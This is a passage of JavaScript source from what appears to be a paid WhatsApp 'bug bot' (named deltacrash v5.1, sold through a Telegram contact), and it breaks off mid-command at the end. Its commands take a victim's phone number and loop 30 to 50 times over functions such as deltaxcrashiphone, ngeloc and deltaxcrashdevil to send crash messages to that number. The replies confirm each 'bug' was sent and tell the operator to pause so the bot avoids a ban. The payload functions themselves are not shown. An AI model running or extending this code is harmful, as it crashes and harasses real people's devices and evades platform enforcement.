if (!q) return reply(`Penggunaan .${command} 6283123456789`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return reply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 6283123456789`)
let target = bijipler + '@s.whatsapp.net'
await reply(`_</> successfully send bug to target_`)
for (let j = 0; j < 30; j++) {
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await deltaxcrashiphone(target)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await deltaxcrashiphone(target)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await deltaxcrashdevil(target, deltaxcrashcrash)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await deltaxcrashdevil(target, deltaxcrashcrash)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await deltaxcrashdevil(target, deltaxcrashcrash)
await ngeloc(target, deltaxcrashcrash)
}
await reply(`彡 Successfully Send Bug to ${bijipler} Using ${command}. 彡\n\n<!> Pause 3 minutes so that the bot is not banned.`)
}
break
case 'lorazalora-un': {

if (!isPremium) return reply('khusus penggunaa. beli script deltacrash v5.1?? hubungi owner t.me/deltaxcrash')
if (!q) return reply(`Penggunaan .${command} 6283123456789`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return reply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 6283123456789`)
let target = bijipler + '@s.whatsapp.net'
await reply(`_</> successfully send bug to target_`)
for (let j = 0; j < 30; j++) {
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await deltaxcrashiphone(target)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await deltaxcrashiphone(target)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await deltaxcrashdevil(target, deltaxcrashcrash)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await deltaxcrashdevil(target, deltaxcrashcrash)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await deltaxcrashdevil(target, deltaxcrashcrash)
await ngeloc(target, deltaxcrashcrash)
}
await reply(`彡 Successfully Send Bug to ${bijipler} Using ${command}. 彡\n\n<!> Pause 3 minutes so that the bot is not banned.`)
}
break
case 'lorazalora-pers': {

if (!isPremium) return reply('khusus penggunaa. beli script deltacrash v5.1?? hubungi owner t.me/deltaxcrash')
if (!q) return reply(`Penggunaan .${command} 6283123456789`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return reply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 6283123456789`)
let target = bijipler + '@s.whatsapp.net'
await reply(`_</> successfully send bug to target_`)
for (let j = 0; j < 30; j++) {
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await deltaxcrashiphone(target)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await deltaxcrashiphone(target)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await deltaxcrashdevil(target, deltaxcrashcrash)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await deltaxcrashdevil(target, deltaxcrashcrash)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await deltaxcrashdevil(target, deltaxcrashcrash)
await ngeloc(target, deltaxcrashcrash)
}
await reply(`彡 Successfully Send Bug to ${bijipler} Using ${command}. 彡\n\n<!> Pause 3 minutes so that the bot is not banned.`)
}
break
case 'lorazalora-ui': {

if (!isPremium) return reply('khusus penggunaa. beli script deltacrash v5.1?? hubungi owner t.me/deltaxcrash')
if (!q) return reply(`Penggunaan .${command} 6283123456789`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return reply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 6283123456789`)
let target = bijipler + '@s.whatsapp.net'
await reply(`_</> successfully send bug to target_`)
for (let j = 0; j < 30; j++) {
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await deltaxcrashiphone(target)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await deltaxcrashiphone(target)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await deltaxcrashdevil(target, deltaxcrashcrash)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await deltaxcrashdevil(target, deltaxcrashcrash)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await deltaxcrashdevil(target, deltaxcrashcrash)
await ngeloc(target, deltaxcrashcrash)
}
await reply(`彡 Successfully Send Bug to ${bijipler} Using ${command}. 彡\n\n<!> Pause 3 minutes so that the bot is not banned.`)
}
break
// GAUSAH DI RECODE YAAAA APALGI LU RENAME 😂😂😂😂
case 'lorazalora-crash': {

if (!isPremium) return reply('khusus penggunaa. beli script deltacrash v5.1?? hubungi owner t.me/deltaxcrash')
if (!q) return reply(`Penggunaan .${command} 6283123456789`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return reply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 6283123456789`)
let target = bijipler + '@s.whatsapp.net'
await reply(`_</> successfully send bug to target_`)
for (let j = 0; j < 30; j++) {
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await deltaxcrashiphone(target)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await deltaxcrashiphone(target)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await deltaxcrashdevil(target, deltaxcrashcrash)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await deltaxcrashdevil(target, deltaxcrashcrash)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await deltaxcrashdevil(target, deltaxcrashcrash)
await ngeloc(target, deltaxcrashcrash)
}
await reply(`彡 Successfully Send Bug to ${bijipler} Using ${command}. 彡\n\n<!> Pause 3 minutes so that the bot is not banned.`)
}
break

case 'lorazalora-infinity': {

if (!isPremium) return reply('khusus penggunaa. beli script deltacrash v5.1?? hubungi owner t.me/deltaxcrash')
if (!q) return reply(`Penggunaan .${command} 6283123456789`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return reply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 6283123456789`)
let target = bijipler + '@s.whatsapp.net'
await reply(`_</> successfully send bug to target_`)
for (let j = 0; j < 30; j++) {
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await deltaxcrashiphone(target)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await deltaxcrashiphone(target)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await deltaxcrashdevil(target, deltaxcrashcrash)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await deltaxcrashdevil(target, deltaxcrashcrash)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await deltaxcrashdevil(target, deltaxcrashcrash)
await ngeloc(target, deltaxcrashcrash)
}
await reply(`彡 Successfully Send Bug to ${bijipler} Using ${command}. 彡\n\n<!> Pause 3 minutes so that the bot is not banned.`)
}
break
//=================================================//
case 'luchifer': case 'notif-crash': case 'crash-total': case '🔥': {

if (!isPremium) return reply('khusus penggunaa. beli script deltacrash v5.1?? hubungi owner t.me/deltaxcrash')
if (!q) return reply(`Penggunaan .${command} 6283123456789`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return reply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 6283123456789`)
let target = bijipler + '@s.whatsapp.net'
await reply(`_</> successfully send bug to target_`)
for (let j = 0; j < 30; j++) {
await deltaxcrashdevil(target, deltaxcrashcrash)
await ngeloc(target, deltaxcrashcrash)
await ngeloc(target, deltaxcrashcrash)
await deltaxcrashdevil(target, deltaxcrashcrash)
await ngeloc(target, deltaxcrashcrash)
await deltaxcrashdevil(target, deltaxcrashcrash)
await deltaxcrashdevil(target, deltaxcrashcrash)
await ngeloc(target, deltaxcrashcrash)
await ngeloc(target, deltaxcrashcrash)
await deltaxcrashdevil(target, deltaxcrashcrash)
await ngeloc(target, deltaxcrashcrash)
await deltaxcrashdevil(target, deltaxcrashcrash)
await deltaxcrashdevil(target, deltaxcrashcrash)
await ngeloc(target, deltaxcrashcrash)
await ngeloc(target, deltaxcrashcrash)
await deltaxcrashdevil(target, deltaxcrashcrash)
await ngeloc(target, deltaxcrashcrash)
await deltaxcrashdevil(target, deltaxcrashcrash)
await deltaxcrashdevil(target, deltaxcrashcrash)
await ngeloc(target, deltaxcrashcrash)
await ngeloc(target, deltaxcrashcrash)
await deltaxcrashdevil(target, deltaxcrashcrash)
await ngeloc(target, deltaxcrashcrash)
await deltaxcrashdevil(target, deltaxcrashcrash)
}
await reply(`<✓> Successfully Send Bug to ${bijipler} Using ${command}. 彡\n\n<!> Pause 2 minutes so that the bot is not banned.`)
}
break
//=================================================//
case 'chace-bug': {

if (!isPremium) return reply('khusus penggunaa. beli script deltacrash v5.1?? hubungi owner t.me/deltaxcrash')
if (!q) return reply(`Penggunaan .${command} 6283123456789`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return reply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 6283123456789`)
let target = bijipler + '@s.whatsapp.net'
await reply(`_</> successfully send bug to target_`)
for (let j = 0; j < 50; j++) {
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
}
await reply(`<✓> Successfully Send Bug to ${bijipler} Using ${command}. 彡\n\n<!> Pause 2 minutes so that the bot is not banned.`)
}
break
case 'samsung-ui': {

if (!isPremium) return reply('khusus penggunaa. beli script deltacrash v5.1?? hubungi owner t.me/deltaxcrash')
if (!q) return reply(`Penggunaan .${command} 6283123456789`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return reply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 6283123456789`)
let target = bijipler + '@s.whatsapp.net'
await reply(`_</> successfully send bug to target_`)
for (let j = 0; j < 50; j++) {
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
}
await reply(`<✓> Successfully Send Bug to ${bijipler} Using ${command}. 彡\n\n<!> Pause 2 minutes so that the bot is not banned.`)
}
break
case 'vivo-samsung': {

if (!isPremium) return reply('khusus penggunaa. beli script deltacrash v5.1?? hubungi owner t.me/deltaxcrash')
if (!q) return reply(`Penggunaan .${command} 6283123456789`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return reply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 6283123456789`)
let target = bijipler + '@s.whatsapp.net'
await reply(`_</> successfully send bug to target_`)
for (let j = 0; j < 50; j++) {
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
}
await reply(`<✓> Successfully Send Bug to ${bijipler} Using ${command}. 彡\n\n<!> Pause 2 minutes so that the bot is not banned.`)
}
break
case 'samsung-internal': {

if (!isPremium) return reply('khusus penggunaa. beli script deltacrash v5.1?? hubungi owner t.me/deltaxcrash')
if (!q) return reply(`Penggunaan .${command} 6283123456789`)
